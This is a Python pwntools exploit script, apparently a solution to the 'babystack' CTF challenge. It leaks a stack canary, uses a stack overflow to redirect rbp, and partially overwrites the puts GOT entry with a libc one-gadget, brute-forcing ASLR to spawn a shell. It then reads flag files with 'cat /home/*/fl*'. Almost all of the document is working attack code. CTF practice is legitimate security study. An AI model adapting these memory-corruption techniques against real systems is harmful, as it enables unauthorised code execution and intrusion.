#!/usr/bin/env python3

"""
Probably not the intended solution.

Uses limited stack overflow to control rbp, causing the program's last read()
of 0x18 bytes to write into a controlled address. Due to the lack of RELRO and
the call to puts that immediately follows our read(), we perform a partial
overwrite of the least significant bytes of the puts GOT entry (which has
already been resolved) to point to a one-gadget. This still requires a bit of
brute force, and is only successful about 1/4096 attempts.

We also need to clobber the GOT entry immediately before puts to be NULL to
satisfy the constraints of the one-gadget we use.
"""

import os

from pwn import *

the_binary = "./share/babystack"
elf = ELF(the_binary, checksec=False)
context.binary = elf

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("chall.ctf.bamboofox.tw", 10102)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(
        ["./ld-2.29.so", the_binary],
        env={"LD_PRELOAD": os.path.abspath("./libc-2.29.so")},
        # aslr=False
    )

if args.GDB:
    gdb.attach(io, """
        break *0x00401424
        continue
    """)

io.sendafter("Name: \n", "A"*0x10)
io.sendafter("token: \n", "A"*0x10)
io.sendafter("str1: \n", "B"*9)

io.recvuntil("B"*9)
raw_leak = io.recvuntil("\n", drop=True)
stack_cookie = u64(b"\x00" + raw_leak[:7])
log.success("Leaked stack cookie: %#x" % stack_cookie)

io.sendafter("str2: \n", "C"*0x22)

io.sendafter("str1: \n", b"\x00" + b"A"*(0x10-1))
payload = b""
payload += b"D" * 40
payload += p64(stack_cookie)
payload += p64(elf.got.puts - 0x8 + 0x50)
io.sendafter("str2: \n", payload)

# Using one gadget at offset 0x106f04:
# 0x7f12d9d8cf04:      lea    rdi,[rip+0xa8c79]
# 0x7f12d9d8cf0b:      mov    rdx,QWORD PTR [rax]
# 0x7f12d9d8cf0e:      call   0x7f12d9d67950 <execve>
# We send 8 null bytes so that [rsi] == [rax] == NULL.
io.send(b"\x00"*8 + b"\x04\x4f\x8f")
# Below is for w/o ASLR for local testing
# io.send(b"\x00"*8 + b"\x04\xcf\x43")

sleep(0.5)
io.sendline("echo itworked")
while True:
    line = io.recvline().decode()
    if "itworked" in line:
        log.success("Got a shell!")
        io.sendline("cat /home/*/fl*")
        io.interactive()
